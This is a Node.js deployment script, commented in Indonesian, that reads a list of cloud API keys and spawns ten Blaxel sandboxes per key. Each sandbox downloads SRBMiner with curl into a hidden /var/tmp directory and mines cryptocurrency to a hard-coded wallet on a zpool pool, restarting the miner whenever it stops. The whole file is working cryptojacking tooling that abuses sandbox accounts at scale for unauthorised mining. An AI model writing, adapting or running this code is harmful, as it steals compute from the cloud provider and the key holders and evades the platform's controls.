const fs = require('fs');
const blaxelSDK = require('@blaxel/sdk');

// Deteksi metode client dari SDK
const createClient = (apiKey) => {
  if (typeof blaxelSDK.BlaxelClient === 'function') {
    try {
      return new blaxelSDK.BlaxelClient({ apiKey });
    } catch (e) {
      return blaxelSDK.BlaxelClient({ apiKey });
    }
  } else if (typeof blaxelSDK.blaxelClient === 'function') {
    return blaxelSDK.blaxelClient({ apiKey });
  } else if (typeof blaxelSDK.createBlaxelClient === 'function') {
    return blaxelSDK.createBlaxelClient({ apiKey });
  } else {
    // Fallback objek bawaan SDK
    return blaxelSDK;
  }
};

const SYS_DIR = "/var/tmp/.srb_runner";
const LOG_FILE = "/tmp/srbminer.log";
const SRB_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.6.5/SRBMiner-Multi-3-6-5-Linux.tar.gz";

const ALGO = "minotaurx";
const HOST = "minotaurx.sea.mine.zpool.ca";
const PORT = 7019;
const WALLET = "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM";
const PASSWORD = "c=DGB";

// Auto-restart loop biar miner kga pernah mati/ke-close
function getBashScript(workerLabel) {
  return `#!/bin/bash
mkdir -p ${SYS_DIR}
cd ${SYS_DIR} || exit 1

if [ ! -f SRBMiner-MULTI ]; then
    echo "[${workerLabel}] Downloading SRBMiner..."
    curl -sL "${SRB_URL}" -o srb.tar.gz
    tar -xzf srb.tar.gz --strip-components=1
    rm -f srb.tar.gz
fi

while true; do
    echo "[${workerLabel}] Starting SRBMiner..."
    ./SRBMiner-MULTI --disable-gpu --algorithm ${ALGO} --pool stratum+tcp://${HOST}:${PORT} --wallet ${WALLET} --password ${PASSWORD},id=${workerLabel} --cpu-threads 2
    echo "[${workerLabel}] Miner stopped/crashed. Restarting in 5 seconds..."
    sleep 5
done
`;
}

async function deployAccount(apiKey, accIndex) {
  process.env.BLAXEL_API_KEY = apiKey;
  const client = createClient(apiKey);
  const tasks = [];

  for (let slot = 1; slot <= 10; slot++) {
    const workerName = `srb-acc${accIndex}-slot${slot}`;
    const bashScript = getBashScript(workerName);
    const fullCmd = `mkdir -p ${SYS_DIR} && echo '${bashScript}' > ${SYS_DIR}/run.sh && chmod +x ${SYS_DIR}/run.sh && ${SYS_DIR}/run.sh > ${LOG_FILE} 2>&1 & tail -f /dev/null`;

    tasks.push(
      (async () => {
        try {
          console.log(`🚀 [Acc-${accIndex}] Spawning ${workerName}...`);

          // Panggil sandboxes.create
          const sandboxes = client.sandboxes || blaxelSDK.sandboxes;
          if (!sandboxes || typeof sandboxes.create !== 'function') {
            throw new Error("Method sandboxes.create tidak ditemukan di SDK");
          }

          await sandboxes.create({
            name: workerName,
            resources: { cpu: 2, memory: "4096Mi" },
            spec: { command: ["/bin/bash", "-c", fullCmd] }
          });

          console.log(`🔥 [Acc-${accIndex}] ${workerName} RUNNING!`);
        } catch (err) {
          console.error(`❌ [Acc-${accIndex}] ${workerName} FAILED:`, err.message || err);
        }
      })()
    );
  }
  await Promise.all(tasks);
}

async function main() {
  if (!fs.existsSync('list.txt')) {
    console.error("❌ File list.txt tidak ditemukan!");
    process.exit(1);
  }

  const keys = fs.readFileSync('list.txt', 'utf-8')
    .split('\n')
    .map(k => k.trim())
    .filter(k => k && !k.startsWith('#'));

  if (keys.length === 0) {
    console.error("❌ File list.txt kosong!");
    process.exit(1);
  }

  console.log(`📦 Memulai Deploy ${keys.length} Key (Total ${keys.length * 10} Sandboxes)...`);
  
  for (let i = 0; i < keys.length; i++) {
    await deployAccount(keys[i], i + 1);
  }
  console.log("\n🎉 Deploy selesai! Semua container running.");
}

main();
